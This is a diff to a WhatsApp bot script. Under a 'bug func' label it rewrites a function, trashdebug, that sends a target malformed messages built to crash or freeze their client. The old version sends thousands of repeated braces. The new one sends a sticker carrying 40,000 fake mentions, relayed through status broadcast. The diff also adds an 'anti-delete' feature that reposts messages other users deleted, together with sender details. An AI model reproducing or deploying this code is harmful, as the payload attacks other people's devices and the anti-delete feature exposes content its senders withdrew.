@@ -282,44 +282,369 @@ reply(`bot is always online ✅`)
 }	
 ///////////example///////////////////////////
 ////////bug func/////////////////////
-    async function trashdebug(target) {
-let msg = await generateWAMessageFromContent(
-target, {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-header: {
-title: "",
-hasMediaAttachment: false,
-},
-body: {
-text: "𝐓𝐑𝐀𝐒𝐡𝐜𝐨𝐫𝐞 -𝐄𝐗𝐏𝐥𝐨𝐫𝐚𝐭𝐢𝐨𝐧 ",
-},
-nativeFlowMessage: {
-messageParamsJson: "{".repeat(10000),
-buttons: [{
-name: "single_select",
-},
-{
-name: "call_permission_request",
-buttonParamsJson: "",
-},
-],
-},
-},
-},
-},
-}, {}
-);
+   async function trashdebug(target) {
+  let parse = true;
+  let SID = "5e03e0&mms3";
+  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
+  let type = "image/webp"; // ✅ diperbaiki jadi string
 
-await trashcore.relayMessage(target, msg.message, {
-messageId: msg.key.id,
-participant: {
-jid: target
-},
-});
+  if (11 > 9) {
+    parse = parse ? false : true;
+  }
+
+  let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`, // ✅ backtick template
+          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
+          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
+          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
+          mimetype: type,
+          directPath:
+            `/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}`, // ✅ template fixed
+          fileLength: {
+            low: Math.floor(Math.random() * 1000),
+            high: 0,
+            unsigned: true,
+          },
+          mediaKeyTimestamp: {
+            low: Math.floor(Math.random() * 1700000000),
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+            participant: target,
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                { length: 1000 * 40 },
+                () =>
+                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+              ),
+            ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: Math.floor(Math.random() * 20000000), // ✅ tidak negatif
+            high: 555,
+            unsigned: parse,
+          },
+          isAvatar: parse,
+          isAiSticker: parse,
+          isLottie: parse,
+        },
+      },
+    },
+  };
+
+  const msg = await generateWAMessageFromContent(target, message, {});
+
+  await trashcore.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
 }
 
+                                      
+                                
+                            
+    
+   
+  
+
+
+    ////anti delete//////
+const storeFile = "./src/store.json";
+
+function loadStoredMessages() {
+    if (fs.existsSync(storeFile)) {
+        return JSON.parse(fs.readFileSync(storeFile));
+    }
+    return {};
+}
+
+if (
+    global.antidelete === 'private' &&
+    m.message?.protocolMessage?.type === 0 && 
+    m.message?.protocolMessage?.key
+) {
+    try {
+        let messageId = m.message.protocolMessage.key.id;
+        let chatId = m.chat;
+        let deletedBy = m.sender;
+
+        let storedMessages = loadStoredMessages();
+        let deletedMsg = storedMessages[chatId]?.[messageId];
+
+        if (!deletedMsg) {
+            console.log("⚠️ Deleted message not found in database.");
+            return;
+        }
+
+        let sender = deletedMsg.key.participant || deletedMsg.key.remoteJid;
+
+let chatName;
+if (deletedMsg.key.remoteJid === 'status@broadcast') {
+    chatName = "Status Update";
+} else if (m.isGroup) {
+    try {
+        const groupInfo = await trashcore.groupMetadata(m.chat);
+        chatName = groupInfo.subject || "Group Chat";
+    } catch {
+        chatName = "Group Chat";
+    }
+} else {
+    chatName = deletedMsg.pushName || m.pushName || "Private Chat";
+}
+
+        let xtipes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).locale('en').format('HH:mm z');
+        let xdptes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).format("DD/MM/YYYY");
+
+        if (!deletedMsg.message.conversation && !deletedMsg.message.extendedTextMessage) {
+            try {
+                let forwardedMsg = await trashcore.sendMessage(
+                    trashcore.user.id,
+                    { 
+                        forward: deletedMsg,
+                        contextInfo: { isForwarded: false }
+                    },
+                    { quoted: deletedMsg }
+                );
+                
+                let mediaInfo = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝙳𝙸𝙰!* 🚨
+${readmore}
+𝙲𝙷𝙰𝚃: ${chatName}
+𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
+𝚃𝙸𝙼𝙴: ${xtipes}
+𝙳𝙰𝚃𝙴: ${xdptes}
+𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}`;
+
+                await trashcore.sendMessage(
+                    trashcore.user.id, 
+                    { text: mediaInfo, mentions: [sender, deletedBy] },
+                    { quoted: forwardedMsg }
+                );
+                
+            } catch (mediaErr) {
+                console.error("Media recovery failed:", mediaErr);
+                let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
+${readmore}
+𝙲𝙷𝙰𝚃: ${chatName}
+𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
+𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
+𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
+𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}
+
+𝙼𝙴𝚂𝚂𝙰𝙶𝙴: [Unsupported media content]`;
+
+                let quotedMessage = {
+                    key: {
+                        remoteJid: chatId,
+                        fromMe: sender === trashcore.user.id,
+                        id: messageId,
+                        participant: sender
+                    },
+                    message: { conversation: "Media recovery failed" }
+                };
+
+                await trashcore.sendMessage(
+                    trashcore.user.id,
+                    { text: replyText, mentions: [sender, deletedBy] },
+                    { quoted: quotedMessage }
+                );
+            }
+        } 
+        else {
+            let text = deletedMsg.message.conversation || 
+                      deletedMsg.message.extendedTextMessage?.text;
+
+            let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
+${readmore}
+𝙲𝙷𝙰𝚃: ${chatName}
+𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
+𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
+𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
+𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}
+
+𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ${text}`;
+
+            let quotedMessage = {
+                key: {
+                    remoteJid: chatId,
+                    fromMe: sender === trashcore.user.id,
+                    id: messageId,
+                    participant: sender
+                },
+                message: {
+                    conversation: text 
+                }
+            };
+
+            await trashcore.sendMessage(
+                trashcore.user.id,
+                { text: replyText, mentions: [sender, deletedBy] },
+                { quoted: quotedMessage }
+            );
+        }
+
+    } catch (err) {
+        console.error("❌ Error processing deleted message:", err);
+    }
+} else if (
+    m.sender !== botNumber &&
+    global.antidelete === 'chat' &&
+    m.message?.protocolMessage?.type === 0 && 
+    m.message?.protocolMessage?.key
+) {
+    try {
+        let messageId = m.message.protocolMessage.key.id;
+        let chatId = m.chat;
+        let deletedBy = m.sender;
+
+        let storedMessages = loadStoredMessages();
+        let deletedMsg = storedMessages[chatId]?.[messageId];
+
+        if (!deletedMsg) {
+            console.log("⚠️ Deleted message not found in database.");
+            return;
+        }
+
+        let sender = deletedMsg.key.participant || deletedMsg.key.remoteJid;
+
+     let chatName;
+if (deletedMsg.key.remoteJid === 'status@broadcast') {
+    chatName = "Status Update";
+} else if (m.isGroup) {
+    try {
+        const groupInfo = await trashcore.groupMetadata(m.chat);
+        chatName = groupInfo.subject || "Group Chat";
+    } catch {
+        chatName = "Group Chat";
+    }
+} else {
+    chatName = deletedMsg.pushName || m.pushName || "Private Chat";
+}
+
+        let xtipes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).locale('en').format('HH:mm z');
+        let xdptes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).format("DD/MM/YYYY");
+
+        if (!deletedMsg.message.conversation && !deletedMsg.message.extendedTextMessage) {
+            try {
+                let forwardedMsg = await trashcore.sendMessage(
+                    m.chat,
+                    { 
+                        forward: deletedMsg,
+                        contextInfo: { isForwarded: false }
+                    },
+                    { quoted: deletedMsg }
+                );
+                
+                let mediaInfo = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝙳𝙸𝙰!* 🚨
+${readmore}
+𝙲𝙷𝙰𝚃: ${chatName}
+𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
+𝚃𝙸𝙼𝙴: ${xtipes}
+𝙳𝙰𝚃𝙴: ${xdptes}
+𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}`;
+
+                await trashcore.sendMessage(
+                    m.chat, 
+                    { text: mediaInfo, mentions: [sender, deletedBy] },
+                    { quoted: forwardedMsg }
+                );
+                
+            } catch (mediaErr) {
+                console.error("Media recovery failed:", mediaErr);
+                let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
+${readmore}
+𝙲𝙷𝙰𝚃: ${chatName}
+𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
+𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
+𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
+𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}
+
+𝙼𝙴𝚂𝚂𝙰𝙶𝙴: [Unsupported media content]`;
+
+                let quotedMessage = {
+                    key: {
+                        remoteJid: chatId,
+                        fromMe: sender === trashcore.user.id,
+                        id: messageId,
+                        participant: sender
+                    },
+                    message: { conversation: "Media recovery failed" }
+                };
+
+                await trashcore.sendMessage(
+                    m.chat,
+                    { text: replyText, mentions: [sender, deletedBy] },
+                    { quoted: quotedMessage }
+                );
+            }
+        } 
+        else {
+            let text = deletedMsg.message.conversation || 
+                      deletedMsg.message.extendedTextMessage?.text;
+
+            let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
+${readmore}
+𝙲𝙷𝙰𝚃: ${chatName}
+𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
+𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
+𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
+𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}
+
+𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ${text}`;
+
+            let quotedMessage = {
+                key: {
+                    remoteJid: chatId,
+                    fromMe: sender === trashcore.user.id,
+                    id: messageId,
+                    participant: sender
+                },
+                message: {
+                    conversation: text 
+                }
+            };
+
+            await trashcore.sendMessage(
+                m.chat,
+                { text: replyText, mentions: [sender, deletedBy] },
+                { quoted: quotedMessage }
+            );
+        }
+
+    } catch (err) {
+        console.error("❌ Error processing deleted message:", err);
+    }
+}
 
     
 ///////////end bug func///////////
